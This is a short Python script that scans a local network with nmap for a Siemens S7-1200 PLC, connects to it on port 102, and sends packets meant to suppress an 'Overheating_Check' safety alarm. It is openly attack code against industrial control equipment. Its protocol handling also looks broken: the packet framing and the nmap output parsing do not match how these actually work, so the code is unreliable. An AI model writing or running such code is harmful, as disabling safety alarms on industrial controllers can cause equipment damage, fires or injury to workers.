import socket
import struct
import subprocess

# Define the network range to scan
network_range = '192.168.1.0/24'

# Use Nmap to scan the network and find the PLC's IP address
output = subprocess.check_output(['nmap', '-sT', network_range])

# Parse the output to find the PLC's IP address
plc_ip = None
for line in output.decode('utf-8').splitlines():
    if 'S7-1200' in line:
        plc_ip = line.split()[0]
        break

if plc_ip is None:
    print("PLC not found")
    exit(1)

# Define the S7-1200 PLC's rack and slot numbers
rack = 0
slot = 1

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the PLC
sock.connect((plc_ip, 102))

# Send the S7CommPlus protocol header
header = struct.pack('>HHHHHH', 0x0001, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000)
sock.send(header)

# Send the alarm suppression request for Overheating_Check
request = struct.pack('>HHHHHH', 0x0004, 0x0000, rack, slot, 0x0000, 0x0002)
sock.send(request)

# Receive the response
response = sock.recv(1024)

# Check if the alarm suppression was successful
if response[0] == 0x04 and response[1] == 0x00:
    print('Alarm suppression successful')
else:
    print('Error suppressing alarm')

# Close the socket
sock.close()